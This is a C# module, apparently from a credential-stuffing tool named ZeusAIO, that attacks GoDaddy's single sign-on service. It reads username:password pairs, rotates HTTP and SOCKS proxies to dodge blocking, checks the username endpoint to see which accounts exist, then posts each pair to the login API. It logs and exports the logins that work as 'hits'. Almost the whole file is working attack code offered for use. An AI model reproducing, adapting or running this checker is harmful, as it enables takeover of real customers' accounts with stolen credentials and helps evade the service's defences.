using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace Godaddy
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.AllowAutoRedirect = false;
                            httpRequest.AddHeader("Cookie", "visitor=vid=b35ec6bc-83fe-429e-9166-e335881f061a;");
                            httpRequest.AddHeader("Host", "sso.godaddy.com");
                            httpRequest.AddHeader("Origin", "https://sso.godaddy.com");
                            httpRequest.AddHeader("Referer", "https://sso.godaddy.com/?realm=idp&path=%2Fproducts&app=account");
                            httpRequest.AddHeader("Sec-Fetch-Dest", "empty");
                            httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
                            httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
                            string str = "{\"checkusername\":\"" + s[0] + "\"}";
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            string strResponse = httpRequest.Post("https://sso.godaddy.com/v1/api/idp/user/checkusername", str, "application/json").ToString();
                            {
                                if (strResponse.Contains("username is invalid") || strResponse.Contains("username is available"))
                                {
                                    //bads
                                    break;
                                }
                                else if (strResponse.Contains("username is unavailable") || strResponse.Contains("message\": \"Ok")) //hit
                                {
                                    httpRequest.AddHeader("Cookie", "visitor=vid=b35ec6bc-83fe-429e-9166-e335881f061a;");
                                    httpRequest.AddHeader("Host", "sso.godaddy.com");
                                    httpRequest.AddHeader("DNT", "1");
                                    httpRequest.AddHeader("Origin", "https://sso.godaddy.com");
                                    httpRequest.AddHeader("Referer", "https://sso.godaddy.com/?realm=idp&path=%2Fproducts&app=account");
                                    httpRequest.AddHeader("Sec-Fetch-Dest", "empty");
                                    httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
                                    httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36");
                                    string str2 = "{\"username\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\",\"remember_me\":false,\"plid\":1,\"API_HOST\":\"godaddy.com\",\"captcha_code\":\"\",\"captcha_type\":\"recaptcha_v2_invisible\"}";
                                    string strResponse2 = httpRequest.Post("https://sso.godaddy.com/v1/api/idp/login?realm=idp&path=%2Fproducts&app=account", str2, "application/json").ToString();
                                    if (strResponse2.Contains("Username and password did not match"))
                                    {
                                        //
                                        break;
                                    }
                                    else if (strResponse2.Contains("message\": \"Ok\""))
                                    {
                                        ZeusAIO.mainmenu.hits++;
                                        if (Config.config.LogorCui == "2")
                                        {
                                            Console.WriteLine("[HIT - GODADDY] " + s[0] + ":" + s[1], Color.Green);
                                        }
                                        Export.AsResult("/Godaddy_hits", s[0] + ":" + s[1]);
                                        return false;
                                    }


                                }
                                else
                                {
                                    ZeusAIO.mainmenu.realretries++;
                                    goto Retry;
                                }
                            }
                            break;
                        }
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
    }
}
